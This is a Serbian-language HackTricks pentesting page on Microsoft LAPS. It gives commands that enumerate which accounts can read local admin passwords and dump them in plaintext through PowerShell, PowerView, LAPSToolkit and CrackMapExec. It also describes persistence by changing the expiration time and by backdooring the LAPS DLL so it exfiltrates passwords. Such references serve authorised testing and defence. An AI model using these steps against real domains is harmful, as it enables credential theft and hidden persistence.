# LAPS

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS ili preuzimanje HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repozitorijum](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repozitorijum](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Osnovne informacije

Local Administrator Password Solution (LAPS) je alat koji se koristi za upravljanje sistemom gde se **administrator lozinke**, koje su **jedinstvene, slučajno generisane i često menjane**, primenjuju na računare pridružene domenu. Ove lozinke se čuvaju bezbedno unutar Active Directory-ja i pristup imaju samo korisnici kojima je dozvoljen pristup putem Access Control Lists (ACLs). Bezbednost prenosa lozinke sa klijenta na server je obezbeđena korišćenjem **Kerberos verzije 5** i **Advanced Encryption Standard (AES)**.

Implementacija LAPS-a na objektima računara u domenu rezultira dodavanjem dva nova atributa: **`ms-mcs-AdmPwd`** i **`ms-mcs-AdmPwdExpirationTime`**. Ovi atributi čuvaju **plain-text administrator lozinku** i **vreme njenog isteka**, redom.

### Provera da li je aktiviran
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Pristup lozinki LAPS

Mogli biste **preuzeti sirovu LAPS politiku** sa `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` i zatim koristiti **`Parse-PolFile`** iz paketa [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) kako biste konvertirali ovaj fajl u lako čitljiv format.

Osim toga, **nativne LAPS PowerShell cmdlets** mogu se koristiti ako su instalirani na mašini do koje imamo pristup:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** takođe može biti korišćen da sazna **ko može pročitati lozinku i pročita je**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) olakšava enumeraciju LAPS-a sa nekoliko funkcija. Jedna od njih je parsiranje **`ExtendedRights`** za **sve računare sa omogućenim LAPS-om**. To će prikazati **grupe** koje su specifično **delegirane za čitanje LAPS lozinki**, koje su često korisnici u zaštićenim grupama.\
Neki **nalog** koji je **pridružio računar** domenu dobija `Sva proširena prava` nad tim računarom, a ovo pravo daje tom **nalogu** mogućnost da **čita lozinke**. Enumeracija može pokazati korisnički nalog koji može čitati LAPS lozinku na računaru. Ovo nam može pomoći da **ciljamo određene AD korisnike** koji mogu čitati LAPS lozinke.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Izbacivanje LAPS lozinki pomoću Crackmapexec-a**
Ako nemate pristup powershell-u, možete zloupotrebiti ovu privilegiju udaljeno putem LDAP-a korišćenjem
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **LAPS Upornost**

### **Datum isteka**

Kada ste administrator, moguće je **dobiti lozinke** i **sprečiti** mašinu da **ažurira** svoju **lozinku** tako što ćete **postaviti datum isteka u budućnost**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Lozinka će se i dalje resetovati ako je **administrator** koristi **`Reset-AdmPwdPassword`** cmdlet; ili ako je omogućeno **Ne dozvoli da vreme isteka lozinke bude duže od onog što je potrebno prema pravilima** u LAPS GPO.
{% endhint %}

### Zadnja vrata

Originalni izvorni kod za LAPS može se pronaći [ovde](https://github.com/GreyCorbel/admpwd), stoga je moguće ubaciti zadnja vrata u kod (unutar metode `Get-AdmPwdPassword` u `Main/AdmPwd.PS/Main.cs` na primer) koja će na neki način **izfiltrirati nove lozinke ili ih negde sačuvati**.

Zatim, samo kompajlirajte novi `AdmPwd.PS.dll` i otpremite ga na mašinu u `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (i promenite vreme modifikacije).

## Reference
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite vašu **kompaniju reklamiranu na HackTricks**? ili želite pristupiti **najnovijoj verziji PEASS ili preuzeti HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grupi** ili **telegram grupi** ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
